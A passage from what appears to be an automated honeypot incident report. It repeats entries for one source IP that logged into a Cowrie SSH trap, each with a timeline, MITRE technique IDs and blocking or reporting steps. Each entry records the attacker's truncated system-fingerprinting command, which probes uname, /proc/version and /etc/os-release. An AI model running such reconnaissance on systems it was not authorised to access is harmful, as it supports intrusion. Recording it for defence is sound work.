| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:22:00` | `cowrie.session.connect` |
| `2026-09-21 17:22:02` | `cowrie.client.version` |
| `2026-09-21 17:22:02` | `cowrie.client.kex` |
| `2026-09-21 17:22:08` | `cowrie.login.success` |
| `2026-09-21 17:22:11` | `cowrie.session.params` |
| `2026-09-21 17:22:11` | `cowrie.command.input` |
| `2026-09-21 17:22:11` | `cowrie.command.input` |
| `2026-09-21 17:22:11` | `cowrie.command.input` |
| `2026-09-21 17:22:11` | `cowrie.command.input` |
| `2026-09-21 17:22:11` | `cowrie.command.input` |
| `2026-09-21 17:22:11` | `cowrie.command.success` |
| `2026-09-21 17:22:11` | `cowrie.command.input` |
| `2026-09-21 17:22:11` | `cowrie.command.input` |
| `2026-09-21 17:22:11` | `cowrie.command.input` |
| `2026-09-21 17:22:11` | `cowrie.command.input` |
| `2026-09-21 17:22:12` | `cowrie.log.closed` |
| `2026-09-21 17:22:15` | `cowrie.session.params` |
| `2026-09-21 17:22:15` | `cowrie.command.input` |
| `2026-09-21 17:22:16` | `cowrie.log.closed` |
| `2026-09-21 17:22:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02d7bdecbb80

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:23 |
| **Last Seen** | 2026-09-21 17:23 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:23:20` | `cowrie.session.connect` |
| `2026-09-21 17:23:21` | `cowrie.client.version` |
| `2026-09-21 17:23:21` | `cowrie.client.kex` |
| `2026-09-21 17:23:26` | `cowrie.login.success` |
| `2026-09-21 17:23:30` | `cowrie.session.params` |
| `2026-09-21 17:23:30` | `cowrie.command.input` |
| `2026-09-21 17:23:30` | `cowrie.command.input` |
| `2026-09-21 17:23:30` | `cowrie.command.input` |
| `2026-09-21 17:23:30` | `cowrie.command.input` |
| `2026-09-21 17:23:30` | `cowrie.command.input` |
| `2026-09-21 17:23:30` | `cowrie.command.success` |
| `2026-09-21 17:23:30` | `cowrie.command.input` |
| `2026-09-21 17:23:30` | `cowrie.command.input` |
| `2026-09-21 17:23:30` | `cowrie.command.input` |
| `2026-09-21 17:23:30` | `cowrie.command.input` |
| `2026-09-21 17:23:31` | `cowrie.log.closed` |
| `2026-09-21 17:23:34` | `cowrie.session.params` |
| `2026-09-21 17:23:34` | `cowrie.command.input` |
| `2026-09-21 17:23:35` | `cowrie.log.closed` |
| `2026-09-21 17:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0854ae6c9c5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:24 |
| **Last Seen** | 2026-09-21 17:24 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:24:41` | `cowrie.session.connect` |
| `2026-09-21 17:24:43` | `cowrie.client.version` |
| `2026-09-21 17:24:43` | `cowrie.client.kex` |
| `2026-09-21 17:24:48` | `cowrie.login.success` |
| `2026-09-21 17:24:51` | `cowrie.session.params` |
| `2026-09-21 17:24:51` | `cowrie.command.input` |
| `2026-09-21 17:24:51` | `cowrie.command.input` |
| `2026-09-21 17:24:51` | `cowrie.command.input` |
| `2026-09-21 17:24:51` | `cowrie.command.input` |
| `2026-09-21 17:24:51` | `cowrie.command.input` |
| `2026-09-21 17:24:51` | `cowrie.command.success` |
| `2026-09-21 17:24:51` | `cowrie.command.input` |
| `2026-09-21 17:24:51` | `cowrie.command.input` |
| `2026-09-21 17:24:51` | `cowrie.command.input` |
| `2026-09-21 17:24:51` | `cowrie.command.input` |
| `2026-09-21 17:24:52` | `cowrie.log.closed` |
| `2026-09-21 17:24:55` | `cowrie.session.params` |
| `2026-09-21 17:24:55` | `cowrie.command.input` |
| `2026-09-21 17:24:55` | `cowrie.log.closed` |
| `2026-09-21 17:24:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70040414d4f1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:26 |
| **Last Seen** | 2026-09-21 17:26 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:26:03` | `cowrie.session.connect` |
| `2026-09-21 17:26:04` | `cowrie.client.version` |
| `2026-09-21 17:26:04` | `cowrie.client.kex` |
| `2026-09-21 17:26:08` | `cowrie.login.success` |
| `2026-09-21 17:26:11` | `cowrie.session.params` |
| `2026-09-21 17:26:11` | `cowrie.command.input` |
| `2026-09-21 17:26:11` | `cowrie.command.input` |
| `2026-09-21 17:26:11` | `cowrie.command.input` |
| `2026-09-21 17:26:11` | `cowrie.command.input` |
| `2026-09-21 17:26:11` | `cowrie.command.input` |
| `2026-09-21 17:26:11` | `cowrie.command.success` |
| `2026-09-21 17:26:11` | `cowrie.command.input` |
| `2026-09-21 17:26:11` | `cowrie.command.input` |
| `2026-09-21 17:26:11` | `cowrie.command.input` |
| `2026-09-21 17:26:11` | `cowrie.command.input` |
| `2026-09-21 17:26:12` | `cowrie.log.closed` |
| `2026-09-21 17:26:15` | `cowrie.session.params` |
| `2026-09-21 17:26:15` | `cowrie.command.input` |
| `2026-09-21 17:26:16` | `cowrie.log.closed` |
| `2026-09-21 17:26:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71a06bcdc0b9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:27 |
| **Last Seen** | 2026-09-21 17:27 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:27:24` | `cowrie.session.connect` |
| `2026-09-21 17:27:25` | `cowrie.client.version` |
| `2026-09-21 17:27:25` | `cowrie.client.kex` |
| `2026-09-21 17:27:29` | `cowrie.login.success` |
| `2026-09-21 17:27:33` | `cowrie.session.params` |
| `2026-09-21 17:27:33` | `cowrie.command.input` |
| `2026-09-21 17:27:33` | `cowrie.command.input` |
| `2026-09-21 17:27:33` | `cowrie.command.input` |
| `2026-09-21 17:27:33` | `cowrie.command.input` |
| `2026-09-21 17:27:33` | `cowrie.command.input` |
| `2026-09-21 17:27:33` | `cowrie.command.success` |
| `2026-09-21 17:27:33` | `cowrie.command.input` |
| `2026-09-21 17:27:33` | `cowrie.command.input` |
| `2026-09-21 17:27:33` | `cowrie.command.input` |
| `2026-09-21 17:27:33` | `cowrie.command.input` |
| `2026-09-21 17:27:34` | `cowrie.log.closed` |
| `2026-09-21 17:27:36` | `cowrie.session.params` |
| `2026-09-21 17:27:36` | `cowrie.command.input` |
| `2026-09-21 17:27:37` | `cowrie.log.closed` |
| `2026-09-21 17:27:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2c853a0a08a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:28 |
| **Last Seen** | 2026-09-21 17:29 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:28:47` | `cowrie.session.connect` |
| `2026-09-21 17:28:48` | `cowrie.client.version` |
| `2026-09-21 17:28:48` | `cowrie.client.kex` |
| `2026-09-21 17:28:53` | `cowrie.login.success` |
| `2026-09-21 17:28:56` | `cowrie.session.params` |
| `2026-09-21 17:28:56` | `cowrie.command.input` |
| `2026-09-21 17:28:56` | `cowrie.command.input` |
| `2026-09-21 17:28:56` | `cowrie.command.input` |
| `2026-09-21 17:28:56` | `cowrie.command.input` |
| `2026-09-21 17:28:56` | `cowrie.command.input` |
| `2026-09-21 17:28:56` | `cowrie.command.success` |
| `2026-09-21 17:28:56` | `cowrie.command.input` |
| `2026-09-21 17:28:56` | `cowrie.command.input` |
| `2026-09-21 17:28:56` | `cowrie.command.input` |
| `2026-09-21 17:28:56` | `cowrie.command.input` |
| `2026-09-21 17:28:57` | `cowrie.log.closed` |
| `2026-09-21 17:28:59` | `cowrie.session.params` |
| `2026-09-21 17:28:59` | `cowrie.command.input` |
| `2026-09-21 17:29:00` | `cowrie.log.closed` |
| `2026-09-21 17:29:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dc62fbc1bf2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:30 |
| **Last Seen** | 2026-09-21 17:30 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:30:12` | `cowrie.session.connect` |
| `2026-09-21 17:30:13` | `cowrie.client.version` |
| `2026-09-21 17:30:13` | `cowrie.client.kex` |
| `2026-09-21 17:30:17` | `cowrie.login.success` |
| `2026-09-21 17:30:20` | `cowrie.session.params` |
| `2026-09-21 17:30:20` | `cowrie.command.input` |
| `2026-09-21 17:30:20` | `cowrie.command.input` |
| `2026-09-21 17:30:20` | `cowrie.command.input` |
| `2026-09-21 17:30:20` | `cowrie.command.input` |
| `2026-09-21 17:30:20` | `cowrie.command.input` |
| `2026-09-21 17:30:20` | `cowrie.command.success` |
| `2026-09-21 17:30:20` | `cowrie.command.input` |
| `2026-09-21 17:30:20` | `cowrie.command.input` |
| `2026-09-21 17:30:20` | `cowrie.command.input` |
| `2026-09-21 17:30:20` | `cowrie.command.input` |
| `2026-09-21 17:30:21` | `cowrie.log.closed` |
| `2026-09-21 17:30:23` | `cowrie.session.params` |
| `2026-09-21 17:30:23` | `cowrie.command.input` |
| `2026-09-21 17:30:24` | `cowrie.log.closed` |
| `2026-09-21 17:30:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55dfcb199933

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:31 |
| **Last Seen** | 2026-09-21 17:31 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:31:35` | `cowrie.session.connect` |
| `2026-09-21 17:31:35` | `cowrie.client.version` |
| `2026-09-21 17:31:35` | `cowrie.client.kex` |
| `2026-09-21 17:31:39` | `cowrie.login.success` |
| `2026-09-21 17:31:41` | `cowrie.session.params` |
| `2026-09-21 17:31:41` | `cowrie.command.input` |
| `2026-09-21 17:31:41` | `cowrie.command.input` |
| `2026-09-21 17:31:41` | `cowrie.command.input` |
| `2026-09-21 17:31:41` | `cowrie.command.input` |
| `2026-09-21 17:31:41` | `cowrie.command.input` |
| `2026-09-21 17:31:41` | `cowrie.command.success` |
| `2026-09-21 17:31:41` | `cowrie.command.input` |
| `2026-09-21 17:31:41` | `cowrie.command.input` |
| `2026-09-21 17:31:41` | `cowrie.command.input` |
| `2026-09-21 17:31:41` | `cowrie.command.input` |
| `2026-09-21 17:31:42` | `cowrie.log.closed` |
| `2026-09-21 17:31:44` | `cowrie.session.params` |
| `2026-09-21 17:31:44` | `cowrie.command.input` |
| `2026-09-21 17:31:45` | `cowrie.log.closed` |
| `2026-09-21 17:31:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daaefe533149

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:32 |
| **Last Seen** | 2026-09-21 17:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:32:54` | `cowrie.session.connect` |
| `2026-09-21 17:32:55` | `cowrie.client.version` |
| `2026-09-21 17:32:55` | `cowrie.client.kex` |
| `2026-09-21 17:32:58` | `cowrie.login.success` |
| `2026-09-21 17:33:00` | `cowrie.session.params` |
| `2026-09-21 17:33:00` | `cowrie.command.input` |
| `2026-09-21 17:33:00` | `cowrie.command.input` |
| `2026-09-21 17:33:00` | `cowrie.command.input` |
| `2026-09-21 17:33:00` | `cowrie.command.input` |
| `2026-09-21 17:33:00` | `cowrie.command.input` |
| `2026-09-21 17:33:00` | `cowrie.command.success` |
| `2026-09-21 17:33:00` | `cowrie.command.input` |
| `2026-09-21 17:33:01` | `cowrie.command.input` |
| `2026-09-21 17:33:01` | `cowrie.command.input` |
| `2026-09-21 17:33:01` | `cowrie.command.input` |
| `2026-09-21 17:33:02` | `cowrie.log.closed` |
| `2026-09-21 17:33:03` | `cowrie.session.params` |
| `2026-09-21 17:33:03` | `cowrie.command.input` |
| `2026-09-21 17:33:04` | `cowrie.log.closed` |
| `2026-09-21 17:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7860f38b6fee

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:34 |
| **Last Seen** | 2026-09-21 17:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:34:11` | `cowrie.session.connect` |
| `2026-09-21 17:34:12` | `cowrie.client.version` |
| `2026-09-21 17:34:12` | `cowrie.client.kex` |
| `2026-09-21 17:34:15` | `cowrie.login.success` |
| `2026-09-21 17:34:17` | `cowrie.session.params` |
| `2026-09-21 17:34:17` | `cowrie.command.input` |
| `2026-09-21 17:34:17` | `cowrie.command.input` |
| `2026-09-21 17:34:17` | `cowrie.command.input` |
| `2026-09-21 17:34:17` | `cowrie.command.input` |
| `2026-09-21 17:34:17` | `cowrie.command.input` |
| `2026-09-21 17:34:17` | `cowrie.command.success` |
| `2026-09-21 17:34:17` | `cowrie.command.input` |
| `2026-09-21 17:34:17` | `cowrie.command.input` |
| `2026-09-21 17:34:17` | `cowrie.command.input` |
| `2026-09-21 17:34:17` | `cowrie.command.input` |
| `2026-09-21 17:34:18` | `cowrie.log.closed` |
| `2026-09-21 17:34:20` | `cowrie.session.params` |
| `2026-09-21 17:34:20` | `cowrie.command.input` |
| `2026-09-21 17:34:20` | `cowrie.log.closed` |
| `2026-09-21 17:34:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc60fb6af118

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:35 |
| **Last Seen** | 2026-09-21 17:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:35:28` | `cowrie.session.connect` |
| `2026-09-21 17:35:28` | `cowrie.client.version` |
| `2026-09-21 17:35:28` | `cowrie.client.kex` |
| `2026-09-21 17:35:31` | `cowrie.login.success` |
| `2026-09-21 17:35:33` | `cowrie.session.params` |
| `2026-09-21 17:35:33` | `cowrie.command.input` |
| `2026-09-21 17:35:33` | `cowrie.command.input` |
| `2026-09-21 17:35:33` | `cowrie.command.input` |
| `2026-09-21 17:35:33` | `cowrie.command.input` |
| `2026-09-21 17:35:33` | `cowrie.command.input` |
| `2026-09-21 17:35:33` | `cowrie.command.success` |
| `2026-09-21 17:35:33` | `cowrie.command.input` |
| `2026-09-21 17:35:33` | `cowrie.command.input` |
| `2026-09-21 17:35:33` | `cowrie.command.input` |
| `2026-09-21 17:35:33` | `cowrie.command.input` |
| `2026-09-21 17:35:34` | `cowrie.log.closed` |
| `2026-09-21 17:35:36` | `cowrie.session.params` |
| `2026-09-21 17:35:36` | `cowrie.command.input` |
| `2026-09-21 17:35:37` | `cowrie.log.closed` |
| `2026-09-21 17:35:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75f59ed78398

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:37 |
| **Last Seen** | 2026-09-21 17:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
